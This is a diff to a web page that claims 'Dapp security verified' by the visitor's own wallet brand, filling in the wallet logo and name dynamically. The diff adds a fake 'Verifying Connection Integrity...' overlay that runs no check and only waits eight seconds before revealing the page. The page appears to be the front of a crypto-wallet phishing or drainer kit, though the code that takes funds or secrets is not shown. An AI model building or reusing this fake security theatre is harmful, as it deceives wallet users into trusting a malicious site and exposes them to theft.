@@ -131,10 +131,79 @@
         .verify-btn:active {
             transform: translateY(1px);
         }
+
+        /* ── LOADING ANIMATION ── */
+        #pageLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #f8f9fc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loader-spinner {
+            width: 54px;
+            height: 54px;
+            border: 4px solid rgba(83, 196, 227, 0.2);
+            border-top: 4px solid #00d084;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+            box-shadow: 0 0 15px rgba(0, 208, 132, 0.2);
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loader-text {
+            font-family: 'Orbitron', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: #11002c;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .security-page {
+            display: none;
+        }
     </style>
 </head>
 
 <body>
+    <!-- LOADING OVERLAY -->
+    <div id="pageLoader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Verifying Connection Integrity...</div>
+    </div>
+
     <div class="security-page">
         <div class="security-card">
             <div class="logo-container">
@@ -178,6 +247,16 @@
         // Populate DOM elements dynamically based on the incoming wallet connection
         document.getElementById('walletLogo').src = info.img;
         document.getElementById('securityText').innerHTML = `Dapp security verified by <span>${info.name}</span>`;
+
+        // Hide the loader after 8 seconds and reveal the page
+        setTimeout(() => {
+            const loader = document.getElementById('pageLoader');
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                document.querySelector('.security-page').style.display = 'flex';
+            }, 500);
+        }, 8000);
 
         function navigateToVerify() {
             const btn = document.querySelector('.verify-btn');
